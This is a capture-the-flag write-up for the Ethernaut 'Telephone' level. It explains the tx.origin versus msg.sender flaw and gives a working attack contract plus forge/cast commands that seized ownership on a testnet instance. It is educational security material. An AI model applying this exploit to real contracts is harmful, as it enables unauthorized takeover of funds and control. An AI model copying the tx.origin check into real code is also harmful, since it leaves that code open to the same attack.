# 04 - Telephone

## Overview

- **Difficulty:** 3/10
- **Network:** Sepolia Testnet
- **Instance Address:** [`0x1cac52d22f9fe803fed16f1cc513dec729b3f11f`](https://sepolia.etherscan.io/address/0x1cac52d22f9fe803fed16f1cc513dec729b3f11f)
- **Attack Contract (`TelephoneCaller`):** [`0x028cbafd2d8a604bbd7f64dcf3c680d422e77e9f`](https://sepolia.etherscan.io/address/0x028cbafd2d8a604bbd7f64dcf3c680d422e77e9f)
- **Level Submission Tx:** [`0xf23b4902060f55910c8591938d1707e328a8795ebb68c25ab8ec3ad49db43ddc`](https://sepolia.etherscan.io/tx/0xf23b4902060f55910c8591938d1707e328a8795ebb68c25ab8ec3ad49db43ddc)

---

## Objective

Claim ownership of the contract.

---

## Contract Analysis

The target contract is [`src/04-Telephone/Telephone.sol`](./Telephone.sol):

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}
```

### Vulnerability Breakdown: `tx.origin` vs `msg.sender`

The contract determines whether ownership can be modified using this check:

```solidity
if (tx.origin != msg.sender) {
    owner = _owner;
}
```

Understanding the difference between the two global variables in Solidity:

- **`tx.origin`**: The original Externally Owned Account (EOA) that signed and initiated the entire transaction call chain. It **never changes** throughout a call stack.
- **`msg.sender`**: The immediate caller of the current contract or function frame. If Contract A calls Contract B, then inside Contract B, `msg.sender` is Contract A, while `tx.origin` is the EOA who initiated the transaction.

```text
[ Player EOA ] ───(calls)───▶ [ TelephoneCaller Contract ] ───(calls changeOwner)───▶ [ Telephone Contract ]
   (tx.origin)                     (msg.sender to Telephone)
```

Inside `Telephone`:

- `tx.origin` = `Player EOA`
- `msg.sender` = `TelephoneCaller Contract`
- Therefore, `tx.origin != msg.sender` evaluates to **`true`**!

---

## Attack Contract

The exploit is implemented in [`src/04-Telephone/TelephoneCaller.sol`](./TelephoneCaller.sol):

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import {Telephone} from "./Telephone.sol";

contract TelephoneCaller {
    constructor(address _telephone) {
        Telephone(_telephone).changeOwner(msg.sender);
    }
}
```

### Exploit Design: 1-Tx Execution

By placing the call directly inside the `constructor`:

1. When you deploy `TelephoneCaller`, `msg.sender` in the constructor is your wallet address.
2. During contract creation, `TelephoneCaller` immediately invokes `changeOwner(your_address)` on the `Telephone` instance.
3. The ownership transfer executes atomically in the **exact same deployment transaction** without needing any subsequent function calls!

---

## Step-by-Step Exploit Walkthrough

### 1. Deploy the Attack Contract

Deploy `TelephoneCaller.sol`, passing the `Telephone` instance address to the constructor:

```bash
forge create src/04-Telephone/TelephoneCaller.sol:TelephoneCaller \
  --constructor-args 0x1cac52d22f9fe803fed16f1cc513dec729b3f11f \
  --rpc-url sepolia \
  --account <YOUR_ACCOUNT>
```

- **Deployed Address:** [`0x028cbafd2d8a604bbd7f64dcf3c680d422e77e9f`](https://sepolia.etherscan.io/address/0x028cbafd2d8a604bbd7f64dcf3c680d422e77e9f)

### 2. Verify Ownership Transfer

Read the `owner` state variable on the `Telephone` contract:

```bash
cast call 0x1cac52d22f9fe803fed16f1cc513dec729b3f11f "owner()(address)" --rpc-url sepolia
# Output: Returns player's address (0xf511E1029dE5295f6D0dE05f4431DdA203e63607)
```

### 3. Submit Level

Submit the challenge instance on Ethernaut:

- **Submission Tx:** [`0xf23b4902060f55910c8591938d1707e328a8795ebb68c25ab8ec3ad49db43ddc`](https://sepolia.etherscan.io/tx/0xf23b4902060f55910c8591938d1707e328a8795ebb68c25ab8ec3ad49db43ddc)

---

## Key Security Takeaways

1. **Never Use `tx.origin` for Authentication:**
   Using `require(tx.origin == owner)` for authorization opens contracts to **phishing attacks**. If an owner interacts with a malicious contract, that contract can forward calls to the protected contract, where `tx.origin` will still match the owner!
2. **Use `msg.sender` for Access Control:**
   Standard authorization checks should always use `msg.sender` (or standard libraries like OpenZeppelin's `Ownable`).
3. **Atomic Exploitation via Constructors:**
   Placing exploit logic directly into contract constructors enables 1-transaction attacks that can bypass balance checks or execute before anyone can front-run.
